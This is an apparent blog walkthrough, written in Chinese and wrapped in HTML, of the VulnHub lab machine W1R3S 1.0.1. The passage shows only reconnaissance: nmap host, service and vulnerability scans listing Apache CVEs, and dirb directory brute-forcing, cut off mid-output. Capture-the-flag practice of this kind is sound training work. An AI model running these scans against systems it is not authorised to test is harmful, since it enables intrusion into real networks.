@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="发布日期名称：W1R3S：1.0.1发布日期：2018年2月5日 下载 Download: https:&#x2F;&#x2F;drive.google.com&#x2F;file&#x2F;d&#x2F;1sWJRjku9uNWS0f_Jul24LCQ2ZLucSG4X&#x2F;view?usp&#x3D;sharing Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;w1r3s&#x2F;w1r3s.v1.0.1.zip">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机渗透[W1R3S-1-0-1]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/01/03/W1R3S-1-0-1/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="发布日期名称：W1R3S：1.0.1发布日期：2018年2月5日 下载 Download: https:&#x2F;&#x2F;drive.google.com&#x2F;file&#x2F;d&#x2F;1sWJRjku9uNWS0f_Jul24LCQ2ZLucSG4X&#x2F;view?usp&#x3D;sharing Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;w1r3s&#x2F;w1r3s.v1.0.1.zip">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub129.jpg">
+<meta property="og:image" content="https://hackso.me/assets/images/posts/w1r3s-1.0.1-walkthrough/screenshot-2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub130.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub131.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
+<meta property="article:published_time" content="2020-01-03T05:50:47.000Z">
+<meta property="article:modified_time" content="2020-08-16T17:01:22.116Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub129.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/01/03/W1R3S-1-0-1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/01/03/W1R3S-1-0-1/","path":"2020/01/03/W1R3S-1-0-1/","title":"vulnhub靶机渗透[W1R3S-1-0-1]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulnhub靶机渗透[W1R3S-1-0-1] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E5%B8%83%E6%97%A5%E6%9C%9F"><span class="nav-number">1.</span> <span class="nav-text">发布日期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">3.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">5.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">6.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/01/03/W1R3S-1-0-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulnhub靶机渗透[W1R3S-1-0-1] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub靶机渗透[W1R3S-1-0-1]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-01-03 13:50:47" itemprop="dateCreated datePublished" datetime="2020-01-03T13:50:47+08:00">2020-01-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 01:01:22" itemprop="dateModified" datetime="2020-08-17T01:01:22+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="发布日期"><a href="#发布日期" class="headerlink" title="发布日期"></a>发布日期</h3><p>名称：W1R3S：1.0.1<br>发布日期：2018年2月5日</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
+<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xc1dKUmprdTl1TldTMGZfSnVsMjRMQ1EyWkx1Y1NHNFgvdmlldz91c3A9c2hhcmluZw==">https://drive.google.com/file/d/1sWJRjku9uNWS0f_Jul24LCQ2ZLucSG4X/view?usp=sharing<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS93MXIzcy93MXIzcy52MS4wLjEuemlw">https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS93MXIzcy93MXIzcy52MS4wLjEuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<span id="more"></span>
+
+<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>您已被雇用在W1R3S.inc单个服务器上进行渗透测试并报告所有发现。 他们要求您获得root用户访问权限并找到该flag（位于&#x2F;root目录中）。<br>获得低特权的shell难度：初学者&#x2F;中级<br>特权升级难度：初学者&#x2F;中级<br>关于：这是个易受攻击的Ubuntu box，为您提供一些真实世界的场景，使我想起了OSCP实验室。<br>虚拟机：VMware Workstation</p>
+<p>v1.0.0-2018年5月2日v1.0.1-2018年8月3日</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.66.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.66.7</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">MAC Address: 00:0C:29:AA:7F:FC (VMware)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -Pn -v -p- 192.168.66.7</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -v -A -Pn -T5 -sV --script=vuln 192.168.66.7</span></span><br><span class="line">PORT      STATE  SERVICE         VERSION</span><br><span class="line">20/tcp    closed ftp-data</span><br><span class="line">21/tcp    open   ftp             vsftpd 2.0.8 or later</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp    open   ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp    open   http            Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:apache:http_server:2.4.18: </span><br><span class="line">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span><br><span class="line">|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668</span><br><span class="line">|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169</span><br><span class="line">|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167</span><br><span class="line">|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211</span><br><span class="line">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span><br><span class="line">|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715</span><br><span class="line">|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082</span><br><span class="line">|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788</span><br><span class="line">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span><br><span class="line">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span><br><span class="line">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span><br><span class="line">|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196</span><br><span class="line">|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199</span><br><span class="line">|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333</span><br><span class="line">|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798</span><br><span class="line">|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710</span><br><span class="line">|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743</span><br><span class="line">|       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740</span><br><span class="line">|       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979</span><br><span class="line">|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197</span><br><span class="line">|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span><br><span class="line">|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763</span><br><span class="line">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span><br><span class="line">|       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546</span><br><span class="line">|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283</span><br><span class="line">|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span><br><span class="line">990/tcp   closed ftps</span><br><span class="line">3306/tcp  open   mysql           MySQL (unauthorized)</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>
+
+<p>目录爆破一波</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.66.7/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Wed Jan  8 01:22:15 2020</span><br><span class="line">URL_BASE: http://192.168.66.7/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.66.7/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/                                                     </span><br><span class="line">+ http://192.168.66.7/index.html (CODE:200|SIZE:11321)                                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/javascript/                                                        </span><br><span class="line">+ http://192.168.66.7/server-status (CODE:403|SIZE:277)                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/                                                         </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/alerts/                                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/api/                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/classes/                                             </span><br><span class="line">==&gt; DIRECTORY: 